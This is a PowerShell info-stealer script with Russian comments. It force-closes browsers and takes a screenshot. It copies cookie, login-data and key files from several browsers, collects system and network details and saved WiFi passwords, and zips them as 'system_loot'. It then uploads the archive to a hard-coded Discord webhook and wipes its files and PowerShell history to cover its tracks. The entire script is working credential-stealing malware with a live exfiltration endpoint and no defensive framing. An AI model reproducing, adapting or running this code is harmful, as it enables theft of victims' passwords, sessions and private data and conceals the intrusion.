# Жесткая фиксация кодировки
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001 | Out-Null

$webhookUrl = "https://discord.com/api/webhooks/1414478841853775943/kcGMtu7PIyl1prt3b47kdqDOrzRNlvKyPX6fpNAx39z0fVYi61a4DjiZUS7r-YQ1UtYD"
$tempDir = $env:TEMP
$zipPath = "$tempDir\system_loot_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"

# УБИЙСТВО ВСЕХ БРАУЗЕРОВ
Write-Host "☠️  Убиваем все процессы браузеров..." -ForegroundColor Red
Get-Process | Where-Object {$_.ProcessName -match "(chrome|msedge|brave|firefox|yandex|opera|vivaldi)"} | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# СОЗДАЕМ ВРЕМЕННУЮ ПАПКУ ДЛЯ СБОРА ДАННЫХ
$lootDir = "$tempDir\loot_$(Get-Random)"
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null

# === 1. СКРИНШОТ ЭКРАНА ===
Write-Host "📸 Делаем скриншот..." -ForegroundColor Yellow
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$screenshotPath = "$lootDir\screenshot.png"
$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

# === 2. ВОРОВСТВО COOKIES И ДАННЫХ БРАУЗЕРОВ ===
Write-Host "🍪 Воруем cookies и данные..." -ForegroundColor Yellow

$browserPaths = @(
    "$env:LOCALAPPDATA\BraveSoftware",
    "$env:LOCALAPPDATA\Microsoft\Edge", 
    "$env:LOCALAPPDATA\Google\Chrome",
    "$env:LOCALAPPDATA\Yandex",
    "$env:LOCALAPPDATA\Opera Software",
    "$env:LOCALAPPDATA\Vivaldi",
    "$env:APPDATA\Mozilla"
)

foreach ($basePath in $browserPaths) {
    if (Test-Path $basePath) {
        $dataFiles = Get-ChildItem $basePath -Recurse -ErrorAction SilentlyContinue | 
                   Where-Object { $_.Name -match "(Cookies|Login Data|Web Data|History|Bookmarks|Preferences|Secure Preferences|Local State|places\.sqlite|key4\.db|logins\.json|cookies\.sqlite)" } |
                   Where-Object { $_.Length -lt 50MB } | # Не трогаем огромные файлы
                   Select-Object -First 50
        
        foreach ($file in $dataFiles) {
            try {
                $destDir = "$lootDir\browsers\$($file.Directory.Name)"
                New-Item -ItemType Directory -Path $destDir -Force | Out-Null
                Copy-Item $file.FullName -Destination "$destDir\$($file.Name)" -Force
            } catch {
                Write-Host "Ошибка копирования: $($file.FullName)" -ForegroundColor Red
            }
        }
    }
}

# === 3. ИНФОРМАЦИЯ О СИСТЕМЕ ===
Write-Host "💻 Собираем информацию о системе..." -ForegroundColor Yellow

$systemInfo = @"
=== 🔥 ПОЛНЫЙ ДАМП СИСТЕМЫ ===

💀 ИНФОРМАЦИЯ О КОМПЬЮТЕРЕ:
Имя компьютера: $env:COMPUTERNAME
Пользователь: $env:USERNAME
Домен: $env:USERDOMAIN
Время системы: $(Get-Date)

⚡ АППАРАТНОЕ ОБЕСПЕЧЕНИЕ:
Процессор: $((Get-WmiObject Win32_Processor).Name)
Память: $([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)) GB
Видеокарта: $((Get-WmiObject Win32_VideoController).Name)

🌐 СЕТЕВАЯ ИНФОРМАЦИЯ:
IP адреса:
$((Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | ForEach-Object { "  - $($_.IPAddress)" }) -join "`n")

DNS серверы:
$((Get-DnsClientServerAddress | Where-InterfaceType Ethernet | Select-Object -ExpandProperty ServerAddresses) -join ", ")

📶 СЕТЕВЫЕ СОЕДИНЕНИЯ:
Активные подключения:
$(Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort | Format-Table -AutoSize | Out-String)

🖥️  ПРОЦЕССЫ:
Топ процессов по памяти:
$(Get-Process | Sort-Object WS -Descending | Select-Object -First 10 | Format-Table Name, CPU, WS, Id -AutoSize | Out-String)

🔧 СИСТЕМНЫЕ НАСТРОЙКИ:
Версия OS: $(Get-WmiObject Win32_OperatingSystem).Caption
Сборка: $(Get-WmiObject Win32_OperatingSystem).Version
Локальный диск:
$(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object { "  $($_.DeviceID) - $([math]::Round($_.FreeSpace/1GB,2)) GB свободно из $([math]::Round($_.Size/1GB,2)) GB" })

=== 🚨 КОНЕЦ ДАМПА ===
"@

$systemInfo | Out-File -Encoding UTF8 "$lootDir\system_info.txt"

# === 4. ИНФОРМАЦИЯ О ИНТЕРНЕТЕ ===
Write-Host "🌐 Собираем сетевую информацию..." -ForegroundColor Yellow

$networkInfo = @"
=== 🌐 ПОЛНАЯ СЕТЕВАЯ ИНФОРМАЦИЯ ===

📡 WiFi сети:
$(netsh wlan show profiles | Where-Object {$_ -match "Все профили пользователя"} | ForEach-Object {
    $ssid = $_.Split(":")[1].Trim()
    $password = (netsh wlan show profile name="$ssid" key=clear | Where-Object {$_ -match "Содержимое ключа"}) -split ":"[1]
    "SSID: $ssid | Password: $password"
})

🌐 DNS кэш:
$(Get-DnsClientCache | Select-Object -First 20 | Format-Table Entry, Name, Data -AutoSize | Out-String)

🔌 ARP таблица:
$(Get-NetNeighbor | Where-Object {$_.State -eq 'Reachable'} | Select-Object -First 15 | Format-Table IPAddress, LinkLayerAddress, State -AutoSize | Out-String)

📊 Сетевые адаптеры:
$(Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Format-Table Name, InterfaceDescription, LinkSpeed -AutoSize | Out-String)
"@

$networkInfo | Out-File -Encoding UTF8 "$lootDir\network_info.txt"

# === 5. СОЗДАЕМ ЕБУЧИЙ АРХИВ ===
Write-Host "🗜️  Создаем архив со всем добром..." -ForegroundColor Yellow

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($lootDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
} catch {
    # Резервный метод через 7zip если системный не работает
    if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zipPath "$lootDir\*" -r
    }
}

# === 6. ОТПРАВКА В DISCORD ===
Write-Host "📤 Отправляем все нахуй в Discord..." -ForegroundColor Green

function Send-FileToDiscord {
    param($filePath, $message)
    
    $boundary = [System.Guid]::NewGuid().ToString()
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/octet-stream

$([System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes))
--$boundary
Content-Disposition: form-data; name="content"

$message
--$boundary--
"@

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        Write-Host "✅ Успешно отправлено: $fileName" -ForegroundColor Green
    } catch {
        Write-Host "❌ Ошибка отправки: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Отправляем архив
if (Test-Path $zipPath) {
    $fileSize = [math]::Round((Get-Item $zipPath).Length/1MB, 2)
    $message = @"
🚨 **SYSTEM LOOT COLLECTED** 🚨

📦 Archive Size: ${fileSize}MB
💻 User: $env:USERNAME@$env:COMPUTERNAME  
🌐 IP: $(Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object -First 1 -ExpandProperty IPAddress)
🕐 Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

Contents:
✅ Screenshot
✅ Browser Cookies & Data  
✅ Full System Info
✅ Network Config
✅ WiFi Passwords
✅ DNS Cache
✅ Process List
"@

    Send-FileToDiscord -filePath $zipPath -message $message
}

# === 7. ЗАЧИСТКА СЛЕДОВ ===
Write-Host "🧹 Уничтожаем следы..." -ForegroundColor Yellow

# Удаляем временные файлы
Remove-Item -Path $lootDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue

# Очищаем историю PowerShell
Clear-History

Write-Host "🎯 Готово! Все данные были отправлены." -ForegroundColor Green
Write-Host "📊 Украдено: Cookies, скриншот, системная информация, сетевые данные" -ForegroundColor Cyan